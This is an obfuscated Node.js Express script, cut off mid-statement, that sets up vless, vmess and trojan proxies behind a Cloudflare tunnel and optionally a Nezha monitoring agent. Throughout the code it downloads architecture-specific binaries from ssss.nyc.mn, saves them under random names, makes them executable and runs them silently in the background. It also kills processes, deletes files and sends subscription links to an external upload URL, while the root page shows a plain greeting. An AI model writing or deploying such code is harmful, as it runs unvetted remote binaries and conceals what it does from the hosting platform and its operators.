const _0x408bc3=_0x170e;(function(_0x439720,_0xf96e36){const _0x366b1e={_0x24fedc:0x22e,_0xba401:0x245,_0x593629:0x1dc,_0xb2b30d:0x21d,_0x3c4a9f:0x1e8,_0x11186e:0x24c,_0x27cb03:0x1c7,_0x32499f:0x1b8,_0x4edf8b:0x254},_0x1f4726=_0x170e,_0x3079a6=_0x439720();while(!![]){try{const _0x230d25=-parseInt(_0x1f4726(0x1b1))/0x1+parseInt(_0x1f4726(_0x366b1e._0x24fedc))/0x2*(-parseInt(_0x1f4726(_0x366b1e._0xba401))/0x3)+-parseInt(_0x1f4726(_0x366b1e._0x593629))/0x4*(-parseInt(_0x1f4726(_0x366b1e._0xb2b30d))/0x5)+parseInt(_0x1f4726(_0x366b1e._0x3c4a9f))/0x6*(parseInt(_0x1f4726(0x1c4))/0x7)+-parseInt(_0x1f4726(_0x366b1e._0x11186e))/0x8*(parseInt(_0x1f4726(0x24f))/0x9)+-parseInt(_0x1f4726(0x21b))/0xa*(parseInt(_0x1f4726(_0x366b1e._0x27cb03))/0xb)+parseInt(_0x1f4726(_0x366b1e._0x32499f))/0xc*(parseInt(_0x1f4726(_0x366b1e._0x4edf8b))/0xd);if(_0x230d25===_0xf96e36)break;else _0x3079a6['push'](_0x3079a6['shift']());}catch(_0x5addfd){_0x3079a6['push'](_0x3079a6['shift']());}}}(_0x24ae,0xb5eeb));const express=require(_0x408bc3(0x1e7)),app=express(),axios=require(_0x408bc3(0x22a)),os=require('os'),fs=require('fs'),path=require(_0x408bc3(0x1ee)),{promisify}=require(_0x408bc3(0x1cd)),exec=promisify(require(_0x408bc3(0x261))[_0x408bc3(0x1be)]),{execSync}=require('child_process'),UPLOAD_URL=process['env'][_0x408bc3(0x222)]||'',PROJECT_URL=process[_0x408bc3(0x21e)][_0x408bc3(0x24d)]||'',AUTO_ACCESS=process[_0x408bc3(0x21e)][_0x408bc3(0x211)]||![],FILE_PATH=process[_0x408bc3(0x21e)]['FILE_PATH']||_0x408bc3(0x1ba),SUB_PATH=process[_0x408bc3(0x21e)][_0x408bc3(0x1bc)]||_0x408bc3(0x1ca),PORT=process[_0x408bc3(0x21e)][_0x408bc3(0x26a)]||process[_0x408bc3(0x21e)][_0x408bc3(0x1fb)]||0xbb8,UUID=process[_0x408bc3(0x21e)][_0x408bc3(0x1ab)]||_0x408bc3(0x1b4),NEZHA_SERVER=process[_0x408bc3(0x21e)][_0x408bc3(0x1b3)]||'',NEZHA_PORT=process[_0x408bc3(0x21e)][_0x408bc3(0x251)]||'',NEZHA_KEY=process[_0x408bc3(0x21e)][_0x408bc3(0x240)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||'',ARGO_AUTH=process['env']['ARGO_AUTH']||'',ARGO_PORT=process['env'][_0x408bc3(0x1e5)]||0x1f41,CFIP=process[_0x408bc3(0x21e)]['CFIP']||_0x408bc3(0x1df),CFPORT=process[_0x408bc3(0x21e)][_0x408bc3(0x22b)]||0x1bb,NAME=process[_0x408bc3(0x21e)]['NAME']||'';!fs[_0x408bc3(0x1af)](FILE_PATH)?(fs[_0x408bc3(0x260)](FILE_PATH),console[_0x408bc3(0x253)](FILE_PATH+_0x408bc3(0x20f))):console[_0x408bc3(0x253)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x1bb51e={_0x392a05:0x25c},_0x4e6a1f=_0x408bc3,_0x41f35a=_0x4e6a1f(0x243);let _0x1e634a='';for(let _0x1fa9d9=0x0;_0x1fa9d9<0x6;_0x1fa9d9++){_0x1e634a+=_0x41f35a[_0x4e6a1f(_0x1bb51e._0x392a05)](Math[_0x4e6a1f(0x1f0)](Math['random']()*_0x41f35a[_0x4e6a1f(0x23b)]));}return _0x1e634a;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x170e(_0x2844c6,_0x8756b6){const _0x24ae51=_0x24ae();return _0x170e=function(_0x170eca,_0x460927){_0x170eca=_0x170eca-0x1a7;let _0x391490=_0x24ae51[_0x170eca];return _0x391490;},_0x170e(_0x2844c6,_0x8756b6);}let npmPath=path[_0x408bc3(0x26f)](FILE_PATH,npmName),phpPath=path[_0x408bc3(0x26f)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x408bc3(0x26f)](FILE_PATH,botName),subPath=path[_0x408bc3(0x26f)](FILE_PATH,_0x408bc3(0x25f)),listPath=path[_0x408bc3(0x26f)](FILE_PATH,_0x408bc3(0x1f3)),bootLogPath=path['join'](FILE_PATH,_0x408bc3(0x1b7)),configPath=path[_0x408bc3(0x26f)](FILE_PATH,_0x408bc3(0x1a9));function deleteNodes(){const _0x19b9d7={_0x3eec48:0x1af,_0x5a732c:0x1ed,_0x81d94a:0x20b,_0x1b4d3a:0x1e1,_0x53ae9c:0x21c,_0x216e60:0x23b,_0x3dcd19:0x252,_0x47f505:0x1c9,_0x25951c:0x210},_0x19d8ad=_0x408bc3;try{if(!UPLOAD_URL)return;if(!fs[_0x19d8ad(_0x19b9d7._0x3eec48)](subPath))return;let _0x5e2e03;try{_0x5e2e03=fs[_0x19d8ad(_0x19b9d7._0x5a732c)](subPath,_0x19d8ad(0x269));}catch{return null;}const _0x7a6379=Buffer[_0x19d8ad(0x203)](_0x5e2e03,_0x19d8ad(_0x19b9d7._0x81d94a))[_0x19d8ad(_0x19b9d7._0x1b4d3a)](_0x19d8ad(0x269)),_0x3a7e46=_0x7a6379[_0x19d8ad(_0x19b9d7._0x53ae9c)]('\x0a')['filter'](_0x1a9f15=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x19d8ad(0x219)](_0x1a9f15));if(_0x3a7e46[_0x19d8ad(_0x19b9d7._0x216e60)]===0x0)return;return axios[_0x19d8ad(_0x19b9d7._0x3dcd19)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x19d8ad(_0x19b9d7._0x47f505)]({'nodes':_0x3a7e46}),{'headers':{'Content-Type':_0x19d8ad(_0x19b9d7._0x25951c)}})['catch'](_0x464d18=>{return null;}),null;}catch(_0x53cf0e){return null;}}function cleanupOldFiles(){const _0x5e353c={_0x12b1c7:0x26f,_0x1252d6:0x241},_0xf3ae3=_0x408bc3;try{const _0x665331=fs[_0xf3ae3(0x1fe)](FILE_PATH);_0x665331[_0xf3ae3(0x209)](_0x1e528c=>{const _0x57edde=_0xf3ae3,_0x5a9025=path[_0x57edde(_0x5e353c._0x12b1c7)](FILE_PATH,_0x1e528c);try{const _0x15fb73=fs[_0x57edde(0x1d7)](_0x5a9025);_0x15fb73['isFile']()&&fs[_0x57edde(_0x5e353c._0x1252d6)](_0x5a9025);}catch(_0x457c53){}});}catch(_0x431eb9){}}app[_0x408bc3(0x1f9)]('/',function(_0x40d438,_0x18b07d){const _0x1086e8={_0x4a0a18:0x23e},_0x40cf1a=_0x408bc3;_0x18b07d[_0x40cf1a(0x259)](_0x40cf1a(_0x1086e8._0x4a0a18));});async function generateConfig(){const _0x23d1a9={_0x4efcc8:0x24e,_0x459b96:0x1cc,_0x435a5c:0x1fc,_0x475cff:0x231,_0x3946c6:0x232,_0x497fe0:0x1d3,_0x1bc2ea:0x1d3,_0x15129d:0x1f6,_0x483287:0x255,_0x1d60a9:0x231,_0x1dde24:0x1c6,_0x1661a9:0x258,_0x5d35ea:0x212,_0x4a1b72:0x1f7,_0x3cade5:0x235,_0x20edd6:0x230},_0x1c45f1=_0x408bc3,_0x3aef74={'log':{'access':_0x1c45f1(_0x23d1a9._0x4efcc8),'error':_0x1c45f1(_0x23d1a9._0x4efcc8),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1c45f1(0x232),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x1c45f1(0x1d3),'fallbacks':[{'dest':0xbb9},{'path':_0x1c45f1(0x1f6),'dest':0xbba},{'path':_0x1c45f1(0x1d2),'dest':0xbbb},{'path':_0x1c45f1(_0x23d1a9._0x459b96),'dest':0xbbc}]},'streamSettings':{'network':_0x1c45f1(0x1fc)}},{'port':0xbb9,'listen':_0x1c45f1(0x231),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x1c45f1(_0x23d1a9._0x435a5c),'security':_0x1c45f1(0x1d3)}},{'port':0xbba,'listen':_0x1c45f1(_0x23d1a9._0x475cff),'protocol':_0x1c45f1(_0x23d1a9._0x3946c6),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1c45f1(_0x23d1a9._0x497fe0)},'streamSettings':{'network':'ws','security':_0x1c45f1(_0x23d1a9._0x1bc2ea),'wsSettings':{'path':_0x1c45f1(_0x23d1a9._0x15129d)}},'sniffing':{'enabled':!![],'destOverride':[_0x1c45f1(_0x23d1a9._0x483287),_0x1c45f1(0x1c6),_0x1c45f1(0x212)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1c45f1(_0x23d1a9._0x1d60a9),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1c45f1(_0x23d1a9._0x1dde24),_0x1c45f1(0x212)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1c45f1(0x231),'protocol':_0x1c45f1(_0x23d1a9._0x1661a9),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1c45f1(_0x23d1a9._0x1bc2ea),'wsSettings':{'path':_0x1c45f1(0x1cc)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x1c45f1(_0x23d1a9._0x5d35ea)],'metadataOnly':![]}}],'dns':{'servers':[_0x1c45f1(_0x23d1a9._0x4a1b72)]},'outbounds':[{'protocol':_0x1c45f1(0x1d9),'tag':_0x1c45f1(_0x23d1a9._0x3cade5)},{'protocol':_0x1c45f1(0x1ae),'tag':_0x1c45f1(0x1b5)}]};fs[_0x1c45f1(_0x23d1a9._0x20edd6)](path['join'](FILE_PATH,_0x1c45f1(0x1a9)),JSON['stringify'](_0x3aef74,null,0x2));}function getSystemArchitecture(){const _0x83007f={_0x5e2809:0x236,_0x18c923:0x272},_0x1eff7e=_0x408bc3,_0x7a46f0=os['arch']();return _0x7a46f0===_0x1eff7e(0x1c1)||_0x7a46f0==='arm64'||_0x7a46f0===_0x1eff7e(_0x83007f._0x5e2809)?'arm':_0x1eff7e(_0x83007f._0x18c923);}function downloadFile(_0x27897d,_0x38ffc5,_0x4eca28){const _0x4ef7c9={_0x1d2db6:0x260,_0x55f3fe:0x1f9,_0x3e3b8f:0x216},_0x3596bc={_0x30a933:0x1c3,_0x93eb8d:0x262,_0x293168:0x1b9,_0x1947cd:0x225},_0x38e6ca={_0x3194c1:0x1fd,_0x51c13a:0x1d1},_0x561427=_0x408bc3,_0xc4b841=_0x27897d;!fs[_0x561427(0x1af)](FILE_PATH)&&fs[_0x561427(_0x4ef7c9._0x1d2db6)](FILE_PATH,{'recursive':!![]});const _0x15b7db=fs[_0x561427(0x1f8)](_0xc4b841);axios({'method':_0x561427(_0x4ef7c9._0x55f3fe),'url':_0x38ffc5,'responseType':_0x561427(0x25a)})[_0x561427(0x25d)](_0x2bdbe4=>{const _0x39da61={_0x31c63b:0x23d,_0x26a30c:0x225},_0x3ea313=_0x561427;_0x2bdbe4['data'][_0x3ea313(0x1ac)](_0x15b7db),_0x15b7db['on']('finish',()=>{const _0x48c1f5=_0x3ea313;_0x15b7db[_0x48c1f5(_0x38e6ca._0x3194c1)](),console['log'](_0x48c1f5(0x1ef)+path['basename'](_0xc4b841)+_0x48c1f5(_0x38e6ca._0x51c13a)),_0x4eca28(null,_0xc4b841);}),_0x15b7db['on'](_0x3ea313(0x225),_0x452760=>{const _0x232392=_0x3ea313;fs[_0x232392(_0x39da61._0x31c63b)](_0xc4b841,()=>{});const _0x307c60=_0x232392(0x1ef)+path[_0x232392(0x1c3)](_0xc4b841)+_0x232392(0x262)+_0x452760[_0x232392(0x1b9)];console[_0x232392(_0x39da61._0x26a30c)](_0x307c60),_0x4eca28(_0x307c60);});})[_0x561427(_0x4ef7c9._0x3e3b8f)](_0x186293=>{const _0x11360b=_0x561427,_0x45ff40=_0x11360b(0x1ef)+path[_0x11360b(_0x3596bc._0x30a933)](_0xc4b841)+_0x11360b(_0x3596bc._0x93eb8d)+_0x186293[_0x11360b(_0x3596bc._0x293168)];console[_0x11360b(_0x3596bc._0x1947cd)](_0x45ff40),_0x4eca28(_0x45ff40);});}async function downloadFilesAndRun(){const _0x2e0053={_0x1adc07:0x1d6,_0x19e4a8:0x1b6,_0x28c0ea:0x21c,_0x5d1df9:0x226,_0x3d6640:0x26c,_0xba0370:0x22c,_0x55b47e:0x25b,_0x29769d:0x249,_0x25b9b6:0x1d0,_0x3ccdde:0x230,_0x52d9a2:0x1e9,_0x4dc75b:0x257,_0xd05ccc:0x244,_0xef2f2f:0x1ea,_0xf96dae:0x225,_0x898d6:0x218,_0x23cc2b:0x1b2,_0x12b423:0x26d,_0x1e6f0a:0x253,_0x22f2af:0x242,_0x2ab5b1:0x204,_0x12a497:0x270,_0x5e8a1e:0x1bb,_0x17c118:0x1e3,_0x2d65ad:0x256},_0x1f2542={_0x5062cb:0x1af},_0x52e9b9={_0x435e2a:0x238},_0x17c7c0=_0x408bc3,_0x3ba158=getSystemArchitecture(),_0x4c929d=getFilesForArchitecture(_0x3ba158);if(_0x4c929d[_0x17c7c0(0x23b)]===0x0){console['log'](_0x17c7c0(_0x2e0053._0x1adc07));return;}const _0x14dfdf=_0x4c929d[_0x17c7c0(_0x2e0053._0x19e4a8)](_0x1beaf9=>{return new Promise((_0x2fe500,_0x14f5da)=>{const _0x133535=_0x170e;downloadFile(_0x1beaf9['fileName'],_0x1beaf9[_0x133535(_0x52e9b9._0x435e2a)],(_0x11f21e,_0x519bd9)=>{_0x11f21e?_0x14f5da(_0x11f21e):_0x2fe500(_0x519bd9);});});});try{await Promise[_0x17c7c0(0x1da)](_0x14dfdf);}catch(_0x4a5396){console['error']('Error\x20downloading\x20files:',_0x4a5396);return;}function _0x24ec1c(_0x128e06){const _0x5b514f={_0x1a8cb5:0x225,_0x2f4d1b:0x1e1},_0x1d4bd0=_0x17c7c0,_0x2f92b9=0x1fd;_0x128e06[_0x1d4bd0(0x209)](_0x4d6587=>{const _0x430092=_0x1d4bd0;fs[_0x430092(_0x1f2542._0x5062cb)](_0x4d6587)&&fs[_0x430092(0x266)](_0x4d6587,_0x2f92b9,_0x153715=>{const _0x40a1f5=_0x430092;_0x153715?console[_0x40a1f5(_0x5b514f._0x1a8cb5)](_0x40a1f5(0x1f5)+_0x4d6587+':\x20'+_0x153715):console['log']('Empowerment\x20success\x20for\x20'+_0x4d6587+':\x20'+_0x2f92b9[_0x40a1f5(_0x5b514f._0x2f4d1b)](0x8));});});}const _0x3fbf96=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x24ec1c(_0x3fbf96);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x14d935=NEZHA_SERVER[_0x17c7c0(0x214)](':')?NEZHA_SERVER[_0x17c7c0(_0x2e0053._0x28c0ea)](':')[_0x17c7c0(0x271)]():'',_0x182aef=new Set(['443','8443',_0x17c7c0(_0x2e0053._0x5d1df9),_0x17c7c0(_0x2e0053._0x3d6640),_0x17c7c0(0x205),_0x17c7c0(_0x2e0053._0xba0370)]),_0x22fbb7=_0x182aef[_0x17c7c0(0x20a)](_0x14d935)?_0x17c7c0(0x26b):_0x17c7c0(_0x2e0053._0x55b47e),_0x3fde9e=_0x17c7c0(_0x2e0053._0x29769d)+NEZHA_KEY+_0x17c7c0(_0x2e0053._0x25b9b6)+NEZHA_SERVER+_0x17c7c0(0x227)+_0x22fbb7+_0x17c7c0(0x1fa)+UUID;fs[_0x17c7c0(_0x2e0053._0x3ccdde)](path[_0x17c7c0(0x26f)](FILE_PATH,_0x17c7c0(0x1c0)),_0x3fde9e);const _0x6f7461=_0x17c7c0(0x1b2)+phpPath+_0x17c7c0(0x1dd)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x6f7461),console[_0x17c7c0(0x253)](phpName+_0x17c7c0(0x217)),await new Promise(_0x51ad3d=>setTimeout(_0x51ad3d,0x3e8));}catch(_0x3d9843){console['error'](_0x17c7c0(_0x2e0053._0x52d9a2)+_0x3d9843);}}else{let _0x5e2cc2='';const _0x103e1a=[_0x17c7c0(_0x2e0053._0x4dc75b),_0x17c7c0(0x23c),'2096',_0x17c7c0(_0x2e0053._0x3d6640),_0x17c7c0(0x205),_0x17c7c0(0x22c)];_0x103e1a['includes'](NEZHA_PORT)&&(_0x5e2cc2='--tls');const _0x45fe86=_0x17c7c0(0x1b2)+npmPath+_0x17c7c0(_0x2e0053._0xd05ccc)+NEZHA_SERVER+':'+NEZHA_PORT+_0x17c7c0(_0x2e0053._0xef2f2f)+NEZHA_KEY+'\x20'+_0x5e2cc2+_0x17c7c0(0x22f);try{await exec(_0x45fe86),console[_0x17c7c0(0x253)](npmName+_0x17c7c0(0x217)),await new Promise(_0x33fa1e=>setTimeout(_0x33fa1e,0x3e8));}catch(_0x266c49){console[_0x17c7c0(_0x2e0053._0xf96dae)](_0x17c7c0(_0x2e0053._0x898d6)+_0x266c49);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x5d0f2a=_0x17c7c0(_0x2e0053._0x23cc2b)+webPath+'\x20-c\x20'+FILE_PATH+_0x17c7c0(_0x2e0053._0x12b423);try{await exec(_0x5d0f2a),console[_0x17c7c0(_0x2e0053._0x1e6f0a)](webName+'\x20is\x20running'),await new Promise(_0x2f7a8a=>setTimeout(_0x2f7a8a,0x3e8));}catch(_0x41c310){console[_0x17c7c0(0x225)](_0x17c7c0(_0x2e0053._0x22f2af)+_0x41c310);}if(fs[_0x17c7c0(0x1af)](botPath)){let _0xc32c56;if(ARGO_AUTH[_0x17c7c0(_0x2e0053._0x2ab5b1)](/^[A-Z0-9a-z=]{120,250}$/))_0xc32c56=_0x17c7c0(0x1d4)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0xc32c56=_0x17c7c0(_0x2e0053._0x12a497)+FILE_PATH+_0x17c7c0(_0x2e0053._0x5e8a1e):_0xc32c56=_0x17c7c0(_0x2e0053._0x17c118)+FILE_PATH+_0x17c7c0(_0x2e0053._0x2d65ad)+ARGO_PORT;try{await exec(_0x17c7c0(_0x2e0053._0x23cc2b)+botPath+'\x20'+_0xc32c56+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x17c7c0(0x217)),await new Promise(_0x27003c=>setTimeout(_0x27003c,0x7d0));}catch(_0x124836){console['error']('Error\x20executing\x20command:\x20'+_0x124836);}}await new Promise(_0x266efc=>setTimeout(_0x266efc,0x1388));}function getFilesForArchitecture(_0x5f58ed){const _0x37e3dc={_0x28d31d:0x220,_0x210d88:0x248,_0x1e2e02:0x1c1,_0x4be2df:0x229,_0xd03da2:0x248},_0x1694ae=_0x408bc3;let _0x4d903d;_0x5f58ed===_0x1694ae(0x1c1)?_0x4d903d=[{'fileName':webPath,'fileUrl':_0x1694ae(0x264)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x4d903d=[{'fileName':webPath,'fileUrl':_0x1694ae(0x233)},{'fileName':botPath,'fileUrl':_0x1694ae(0x208)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x173dbf=_0x5f58ed==='arm'?_0x1694ae(_0x37e3dc._0x28d31d):_0x1694ae(0x224);_0x4d903d[_0x1694ae(_0x37e3dc._0x210d88)]({'fileName':npmPath,'fileUrl':_0x173dbf});}else{const _0x59957f=_0x5f58ed===_0x1694ae(_0x37e3dc._0x1e2e02)?_0x1694ae(_0x37e3dc._0x4be2df):_0x1694ae(0x1d5);_0x4d903d[_0x1694ae(_0x37e3dc._0xd03da2)]({'fileName':phpPath,'fileUrl':_0x59957f});}}return _0x4d903d;}function argoType(){const _0x123f7f={_0xf00ecd:0x1cf,_0x77ff5:0x230,_0x1ffaaf:0x26f,_0x24c51f:0x1f1,_0x411b97:0x1bd,_0x176197:0x265,_0x525996:0x253},_0x2d37af=_0x408bc3;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2d37af(0x253)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x2d37af(0x214)](_0x2d37af(_0x123f7f._0xf00ecd))){fs[_0x2d37af(_0x123f7f._0x77ff5)](path[_0x2d37af(_0x123f7f._0x1ffaaf)](FILE_PATH,_0x2d37af(0x20e)),ARGO_AUTH);const _0x321a85=_0x2d37af(0x1c2)+ARGO_AUTH[_0x2d37af(0x21c)]('\x22')[0xb]+_0x2d37af(_0x123f7f._0x24c51f)+path[_0x2d37af(0x26f)](FILE_PATH,_0x2d37af(0x20e))+_0x2d37af(_0x123f7f._0x411b97)+ARGO_DOMAIN+_0x2d37af(_0x123f7f._0x176197)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x2d37af(0x230)](path[_0x2d37af(0x26f)](FILE_PATH,'tunnel.yml'),_0x321a85);}else console[_0x2d37af(_0x123f7f._0x525996)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x458e66={_0x3cdcc4:0x1ed,_0x3c9ffe:0x26f,_0x369c65:0x1b7,_0xb631c4:0x269,_0x95b5d9:0x1e2,_0x349985:0x1aa,_0x36ef9a:0x225},_0x36502a={_0x1ac432:0x1f9,_0x545f87:0x263,_0x5e2bb3:0x202,_0x5df8df:0x215,_0x47f20c:0x1e4,_0x4561d3:0x263,_0x39cb9f:0x206,_0x408964:0x263,_0x415b2d:0x1db},_0x11b5b0={_0x381fb6:0x268,_0x1d882a:0x1de,_0x2711ed:0x25c,_0x51ed11:0x1eb},_0x9baf59=_0x408bc3;let _0x3443b5;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3443b5=ARGO_DOMAIN,console[_0x9baf59(0x253)](_0x9baf59(0x239),_0x3443b5),await _0x1021b8(_0x3443b5);else try{const _0x125e2e=fs[_0x9baf59(_0x458e66._0x3cdcc4)](path[_0x9baf59(_0x458e66._0x3c9ffe)](FILE_PATH,_0x9baf59(_0x458e66._0x369c65)),_0x9baf59(_0x458e66._0xb631c4)),_0x240add=_0x125e2e['split']('\x0a'),_0x4fb8ca=[];_0x240add[_0x9baf59(0x209)](_0x18351b=>{const _0x2c3286=_0x9baf59,_0x12ab63=_0x18351b[_0x2c3286(0x204)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x12ab63){const _0x3f3fdc=_0x12ab63[0x1];_0x4fb8ca[_0x2c3286(0x200)](_0x3f3fdc);}});if(_0x4fb8ca['length']>0x0)_0x3443b5=_0x4fb8ca[0x0],console[_0x9baf59(0x253)](_0x9baf59(_0x458e66._0x95b5d9),_0x3443b5),await _0x1021b8(_0x3443b5);else{console['log'](_0x9baf59(_0x458e66._0x349985)),fs['unlinkSync'](path['join'](FILE_PATH,_0x9baf59(0x1b7)));async function _0x4b52c5(){const _0x379494=_0x9baf59;try{process[_0x379494(0x23f)]===_0x379494(_0x11b5b0._0x381fb6)?await exec(_0x379494(_0x11b5b0._0x1d882a)+botName+_0x379494(0x1e6)):await exec(_0x379494(0x1e0)+botName[_0x379494(_0x11b5b0._0x2711ed)](0x0)+']'+botName[_0x379494(_0x11b5b0._0x51ed11)](0x1)+_0x379494(0x1a7));}catch(_0x171ed4){}}_0x4b52c5(),await new Promise(_0x460e3f=>setTimeout(_0x460e3f,0xbb8));const _0x412370=_0x9baf59(0x1e3)+FILE_PATH+_0x9baf59(0x256)+ARGO_PORT;try{await exec(_0x9baf59(0x1b2)+botPath+'\x20'+_0x412370+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x9baf59(0x217)),await new Promise(_0x3eebe9=>setTimeout(_0x3eebe9,0xbb8)),await extractDomains();}catch(_0x2d3ee0){console[_0x9baf59(_0x458e66._0x36ef9a)]('Error\x20executing\x20command:\x20'+_0x2d3ee0);}}}catch(_0x20e54b){console[_0x9baf59(0x225)](_0x9baf59(0x25e),_0x20e54b);}async function _0x1c354b(){const _0x498288=_0x9baf59;try{const _0x5a8d4a=await axios[_0x498288(_0x36502a._0x1ac432)](_0x498288(0x213),{'timeout':0xbb8});if(_0x5a8d4a[_0x498288(_0x36502a._0x545f87)]&&_0x5a8d4a[_0x498288(0x263)][_0x498288(0x1c8)]&&_0x5a8d4a['data']['org'])return _0x5a8d4a['data'][_0x498288(0x1c8)]+'_'+_0x5a8d4a[_0x498288(_0x36502a._0x545f87)][_0x498288(_0x36502a._0x5e2bb3)];}catch(_0x20c21c){try{const _0x51cc19=await axios[_0x498288(0x1f9)](_0x498288(_0x36502a._0x5df8df),{'timeout':0xbb8});if(_0x51cc19[_0x498288(0x263)]&&_0x51cc19[_0x498288(0x263)][_0x498288(0x1f4)]===_0x498288(_0x36502a._0x47f20c)&&_0x51cc19[_0x498288(_0x36502a._0x4561d3)][_0x498288(_0x36502a._0x39cb9f)]&&_0x51cc19[_0x498288(_0x36502a._0x408964)][_0x498288(_0x36502a._0x5e2bb3)])return _0x51cc19['data'][_0x498288(_0x36502a._0x39cb9f)]+'_'+_0x51cc19['data']['org'];}catch(_0x1a36ba){}}return _0x498288(_0x36502a._0x415b2d);}async function _0x1021b8(_0x2d2508){const _0x24e632={_0x211cd6:0x1ad,_0x37ea2c:0x24a,_0x1feacf:0x203,_0x5f225b:0x20b,_0x5aecb6:0x250,_0x1d02eb:0x1b0,_0x46c08d:0x234,_0x1aee11:0x230,_0x50f042:0x247},_0x868f81=await _0x1c354b(),_0x342459=NAME?NAME+'-'+_0x868f81:_0x868f81;return new Promise(_0x45017d=>{const _0x1497be={_0x4dacfa:0x21a,_0x48d09f:0x267};setTimeout(()=>{const _0x4fbc6d=_0x170e,_0x3672a1={'v':'2','ps':''+_0x342459,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4fbc6d(0x1d3),'net':'ws','type':_0x4fbc6d(0x1d3),'host':_0x2d2508,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x2d2508,'alpn':'','fp':'firefox'},_0x2cb901=_0x4fbc6d(_0x24e632._0x211cd6)+UUID+'@'+CFIP+':'+CFPORT+_0x4fbc6d(0x1d8)+_0x2d2508+_0x4fbc6d(0x1b0)+_0x2d2508+_0x4fbc6d(_0x24e632._0x37ea2c)+_0x342459+'\x0a\x0avmess://'+Buffer[_0x4fbc6d(_0x24e632._0x1feacf)](JSON[_0x4fbc6d(0x1c9)](_0x3672a1))[_0x4fbc6d(0x1e1)](_0x4fbc6d(_0x24e632._0x5f225b))+_0x4fbc6d(0x1bf)+UUID+'@'+CFIP+':'+CFPORT+_0x4fbc6d(_0x24e632._0x5aecb6)+_0x2d2508+_0x4fbc6d(_0x24e632._0x1d02eb)+_0x2d2508+_0x4fbc6d(_0x24e632._0x46c08d)+_0x342459+_0x4fbc6d(0x221);console['log'](Buffer['from'](_0x2cb901)[_0x4fbc6d(0x1e1)](_0x4fbc6d(0x20b))),fs[_0x4fbc6d(_0x24e632._0x1aee11)](subPath,Buffer[_0x4fbc6d(0x203)](_0x2cb901)[_0x4fbc6d(0x1e1)](_0x4fbc6d(_0x24e632._0x5f225b))),console[_0x4fbc6d(0x253)](FILE_PATH+_0x4fbc6d(_0x24e632._0x50f042)),uploadNodes(),app[_0x4fbc6d(0x1f9)]('/'+SUB_PATH,(_0x59eab6,_0x5c802d)=>{const _0x4fb1ba=_0x4fbc6d,_0x227374=Buffer['from'](_0x2cb901)['toString']('base64');_0x5c802d[_0x4fb1ba(0x21f)](_0x4fb1ba(_0x1497be._0x4dacfa),_0x4fb1ba(_0x1497be._0x48d09f)),_0x5c802d[_0x4fb1ba(0x259)](_0x227374);}),_0x45017d(_0x2cb901);},0x7d0);});}}async function uploadNodes(){const _0x16ac18={_0x46e42e:0x210,_0x227d0d:0x1f4,_0x417fac:0x1ff,_0x118b3f:0x20d,_0x2fc62b:0x1af,_0x102957:0x207,_0x14411a:0x253},_0x12bca2=_0x408bc3;if(UPLOAD_URL&&PROJECT_URL){const _0x2b81dd=PROJECT_URL+'/'+SUB_PATH,_0x1562ee={'subscription':[_0x2b81dd]};try{const _0x38e55c=await axios['post'](UPLOAD_URL+_0x12bca2(0x246),_0x1562ee,{'headers':{'Content-Type':_0x12bca2(_0x16ac18._0x46e42e)}});return _0x38e55c&&_0x38e55c[_0x12bca2(_0x16ac18._0x227d0d)]===0xc8?(console[_0x12bca2(0x253)](_0x12bca2(_0x16ac18._0x417fac)),_0x38e55c):null;}catch(_0x372a7d){if(_0x372a7d[_0x12bca2(_0x16ac18._0x118b3f)]){if(_0x372a7d[_0x12bca2(_0x16ac18._0x118b3f)][_0x12bca2(0x1f4)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x12bca2(_0x16ac18._0x2fc62b)](listPath))return;const _0x32fa3a=fs['readFileSync'](listPath,_0x12bca2(0x269)),_0x588b8b=_0x32fa3a['split']('\x0a')[_0x12bca2(0x1ce)](_0x10f9b5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x10f9b5));if(_0x588b8b[_0x12bca2(0x23b)]===0x0)return;const 